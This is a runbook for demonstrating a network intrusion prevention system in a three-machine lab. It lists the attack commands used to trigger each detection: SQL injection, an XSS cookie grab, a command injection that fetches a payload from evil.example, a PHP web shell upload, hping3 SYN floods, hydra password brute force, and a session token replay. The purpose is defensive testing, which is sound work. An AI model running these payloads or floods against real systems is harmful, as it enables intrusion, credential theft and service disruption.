# SENTINEL IPS v2.0 — Demo Runbook

Every attack validated live against real multi-host traffic this week. Ransomware and Malware-C2/JA3 excluded — no honest test path for either in this lab. Replace `<server-ip>` with the actual server laptop's Wi-Fi IP (check with the server operator first — DHCP may hand out a different address than last time).

**3 machines:** server (target + sentinel.py live) · attacker A · attacker B
**Full run:** ~25-30 min · **Core path (marked ⭐):** ~12 min

---

## Phase 0 — Pre-Demo Setup (server machine, before anyone's watching)

```bash
# 1. Firewall rules (elevated PowerShell, once)
netsh advfirewall firewall add rule name="SENTINEL_lab_target" dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="SENTINEL_lab_honeypot" dir=in action=allow protocol=TCP localport=2222,2121,8080,5432,9000

# 2. Start the target service
python lab\target_service.py --host 0.0.0.0

# 3. Start SENTINEL live (separate elevated PowerShell)
.\venv\Scripts\python.exe sentinel.py live --interface "Wi-Fi" --model models\benchmarkids_binary.pkl
# wait for "Live mode active" and the dashboard URL

# 4. Open the dashboard where the panel can see it
# http://localhost:5000
```

On each attacker VM:
```bash
ping <server-ip>
curl http://<server-ip>/
dd if=/dev/urandom of=big.bin bs=1M count=6   # pre-generate the exfil test file
```

---

## Phase 1 — Application Layer (any attacker VM, ~5-10s each)

### 01. SQL Injection ⭐
```bash
curl -G --data-urlencode "q=' UNION SELECT NULL--" http://<server-ip>/search
```
Must use `-G --data-urlencode` — a raw quote in the URL gets rejected by curl before it reaches the server.
**Expect:** `attack=SQLInjection confidence=0.90 severity=MEDIUM mitre=T1190/Execution`

### 02. XSS
```bash
curl -G --data-urlencode "q=<script>alert(document.cookie)</script>" http://<server-ip>/search
```
**Expect:** `attack=XSS confidence=0.90 severity=MEDIUM`

### 03. Command Injection ⭐
```bash
curl -G --data-urlencode "q=; wget http://evil.example/payload" http://<server-ip>/search
```
**Expect:** `attack=CommandInject severity=HIGH action=block_request, ip_block_1h`

### 04. Path Traversal
```bash
curl -G --data-urlencode "q=../../../../etc/passwd" http://<server-ip>/search
```
**Expect:** `attack=PathTraversal severity=HIGH`

### 05. Web Shell Upload ⭐
```bash
# prep once, before demo:
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# run:
curl -X POST http://<server-ip>/upload -F "file=@shell.php"
```
**Expect:** `attack=WebShell severity=CRITICAL mitre=T1505.003`

### 06. CSRF
```bash
# step 1 — get a session
curl -X POST http://<server-ip>/account/login -v   # copy the Set-Cookie value

# step 2 — forge the request (no Origin/Referer header)
curl -X POST http://<server-ip>/account/email -H "Cookie: session=<token>" -d "email=hacked@evil.com"
```
**Expect:** `attack=CSRF action=invalidate_session` (no IP block — the source IP here is the victim's own browser)

---

## Phase 2 — Network Layer

### 07. Port Scan ⭐ (any attacker VM, ~10s)
```bash
nmap -sS -p1-1000 <server-ip>
```
**Expect:** `attack=PortScan confidence=0.6-0.98 mitre=T1046/Discovery`

### 08. Denial of Service (DoS) ⭐ (one attacker VM, ~15s)
```bash
hping3 -S --flood -p 80 <server-ip>
```
Let it run ~15s, then **Ctrl+C — and confirm it actually died**: `ps aux | grep hping3`. A flood this size can leave the pipeline processing a backlog for several minutes if you don't watch `open_flows` on the dashboard.
**Expect:** `attack=DoS confidence=0.75 severity=HIGH action=rate_limit, ip_block`

### 09. Distributed DoS (DDoS) ⭐ — the newest feature (attacker A + attacker B simultaneously, ~20s)
```bash
# BOTH machines, at the same moment:
hping3 -S --flood -p 80 <server-ip>
```
Coordinate verbally ("3, 2, 1, go"). Run ~15-20s overlapping, both Ctrl+C, confirm both processes are dead.
**Expect:** `attack=DDoS` from *both* sources while overlapping. If one stops slightly before the other, the remaining one correctly drops back to `attack=DoS` — that's the fallback working, not a bug.

---

## Phase 3 — Identity & Credentials

### 10. Brute Force (any attacker VM, ~10s)
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 <server-ip> http-post-form \
  "/login:username=^USER^&password=^PASS^:invalid credentials"
```
Ctrl+C after a handful of attempts — you don't need the whole wordlist.
**Expect:** `attack=BruteForce severity=MEDIUM action=ip_block_1h, invalidate_sessions`

### 11. Honeypot — FTP / SSH / API Abuse ⭐ (any attacker VM, ~15s)
Any connection to these ports is 100% confirmed malicious by definition — nothing legitimate should ever touch them.
```bash
# SSH brute-force decoy
echo "admin:password123" | nc -w2 <server-ip> 2222

# FTP brute-force decoy
echo "USER admin" | nc -w2 <server-ip> 2121

# Admin panel / API abuse decoys
echo "GET /admin/users" | nc -w2 <server-ip> 8080
echo "{}" | nc -w2 <server-ip> 9000
```
**Expect:** `attack=Honeypot confidence=1.00 action=ip_block, alert_critical` — four times, one per service

---

## Phase 4 — Behavioral & Advanced

### 12. Bot / C2 Beaconing (any attacker VM, ~20s)
```bash
for i in {1..6}; do curl -s http://<server-ip>/ > /dev/null; sleep 3; done
```
**Expect:** `attack=Bot confidence=0.75 severity=HIGH action=ip_block, c2_domain_block`

### 13. Phishing (any attacker VM, ~5s)
```bash
curl "http://<server-ip>/search?q=verify-your-paypal-account"
```
**Expect:** `attack=Phishing confidence=0.90 mitre=T1566/Initial Access`

### 14. Data Exfiltration (any attacker VM, ~15s)
```bash
curl -X POST http://<server-ip>/upload -F "file=@big.bin"
```
**Expect:** `attack=Exfiltration confidence=0.60 severity=MEDIUM action=log`

### 15. Session Hijacking (attacker A then attacker B, ~20s)
```bash
# attacker A — log in, then prove ownership with a follow-up request
curl -X POST http://<server-ip>/account/login -v   # copy token
curl "http://<server-ip>/search?q=hello" -H "Cookie: session=<token>"

# attacker B — replay the SAME token
curl "http://<server-ip>/search?q=test" -H "Cookie: session=<attacker A's token>"
```
Order matters: attacker A's second command registers them as the legitimate owner. Skip it and the replay just looks like a first-time visitor, not a hijack.
**Expect:** `attack=Session Hijacking action=invalidate_session` (no IP block)

---

## Bonus (optional — only if there's time for nuance)

### 16. Infiltration — a documented limitation, not a failure
```bash
nmap -sS -T2 -p 21,22,23,25,80,443,445,3389,3306,8080 <server-ip>
```
**Expect:** `attack=PortScan` — **not** Infiltration. Honest finding: the model treats any multi-port probing as PortScan-shaped regardless of speed, since it can't distinguish external recon from internal lateral movement at the flow-feature level. Real Infiltration-shaped traffic likely needs actual post-exploitation tooling to reproduce.

---

## If Something Breaks

| Symptom | What it actually is | Fix |
|---|---|---|
| Detections keep streaming minutes after an attack stopped, all on one port | Processing backlog, not a stuck attacker — a big flood outruns the pipeline in real time | Check `open_flows` on the dashboard; if it's in the thousands, restart `sentinel.py live` |
| `curl: (7) Failed to connect`, but `ping` works | `target_service.py` died or was never (re)started | `python lab\target_service.py --host 0.0.0.0` |
| Self-labeled attacks (`src` = server's own IP) | Server's own background traffic — already filtered, cosmetic only | Ignore any line where `src` equals the server's own address |
